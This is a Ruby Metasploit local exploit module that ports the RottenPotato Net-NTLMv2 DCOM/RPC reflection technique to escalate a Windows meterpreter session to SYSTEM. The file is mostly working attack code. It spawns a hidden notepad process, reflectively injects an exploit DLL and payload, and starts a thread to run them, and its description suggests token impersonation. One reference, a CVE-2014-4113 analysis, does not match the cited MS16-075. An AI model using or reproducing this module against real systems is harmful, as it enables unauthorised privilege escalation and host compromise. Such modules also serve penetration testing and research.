##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/reflective_dll_injection'

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::FileInfo
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info={})
    super(update_info(info, {
      'Name'           => 'Windows Net-NTLMv2 Reflection DCOM/RPC',
      'Description'    => %q{
        Module utilizes the Net-NTLMv2 reflection between DCOM/RPC 
	to achieve a SYSTEM handle for elevation of privilege. Currently the module
 	does not spawn as SYSTEM, however once achieving a shell, one can easily 
	use incognito to impersonate the token.

	This is subject to change by the end of the week. I will fix a few bugs
	by the end of the week, and move to easy adaptions of the port & CLSID.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'FoxGloveSec', # the original Potato exploit
          'breenmachine', # Rotten Potato NG!
	  'Mumbai' # Austin : port of RottenPotato for reflection & quick module
        ],
      'Arch'           => [ ARCH_X86, ARCH_X64 ],
      'Platform'       => 'win',
      'SessionTypes'   => [ 'meterpreter' ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'none',
        },
      'Targets'        =>
        [
          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
          [ 'Windows x64', { 'Arch' => ARCH_X64 } ]
        ],
      'Payload'         =>
        {
          'DisableNops' => true
        },
      'References'      =>
        [
          ['MSB', 'MS16-075'],
          ['URL', 'http://blog.trendmicro.com/trendlabs-security-intelligence/an-analysis-of-a-windows-kernel-mode-vulnerability-cve-2014-4113/'],
	  ['URL', 'https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/'],
	  ['URL', 'https://github.com/breenmachine/RottenPotatoNG']
        ],
      'DisclosureDate' => 'Jan 16 2016',
      'DefaultTarget'  => 0
    }))
  end

  def check
    os = sysinfo["OS"]

    if os !~ /windows/i
      # Non-Windows systems are definitely not affected.
      return Exploit::CheckCode::Safe
    end

    if sysinfo["Architecture"] =~ /(wow|x)64/i
      arch = ARCH_X64
    elsif sysinfo["Architecture"] == ARCH_X86
      arch = ARCH_X86
    end


    return Exploit::CheckCode::Appears
  end

  def exploit
    if is_system?
      fail_with(Failure::None, 'Session is already elevated')
    end

    if check == Exploit::CheckCode::Safe
      fail_with(Failure::NotVulnerable, "Exploit not available on this system.")
    end

    if sysinfo["Architecture"] =~ /wow64/i
      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')
    elsif sysinfo["Architecture"] == ARCH_X64 && target.arch.first == ARCH_X86
      fail_with(Failure::NoTarget, 'Session host is x64, but the target is specified as x86')
    elsif sysinfo["Architecture"] == ARCH_X86 && target.arch.first == ARCH_X64
      fail_with(Failure::NoTarget, 'Session host is x86, but the target is specified as x64')
    end

    print_status('Launching notepad to host the exploit...')
    notepad_process = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true})
    begin
      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
    rescue Rex::Post::Meterpreter::RequestError
      print_error('Operation failed. Trying to elevate the current process...')
      process = client.sys.process.open
    end

    print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
    if target.arch.first == ARCH_X86
      dll_file_name = 'MSFRottenPotato_x86.dll'
    else
      dll_file_name = 'MSFRottenPotato_x64.dll'
    end

    library_path = ::File.join(dll_file_name)
    library_path = ::File.expand_path(library_path)

    print_status("Injecting exploit into #{process.pid}...")
    exploit_mem, offset = inject_dll_into_process(process, library_path)

    print_status("Exploit injected. Injecting payload into #{process.pid}...")
    payload_mem = inject_into_process(process, payload.encoded)

    # invoke the exploit, passing in the address of the payload that
    # we want invoked on successful exploitation.
    print_status('Payload injected. Executing exploit...')
    process.thread.create(exploit_mem + offset, payload_mem)

    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')
  end
end


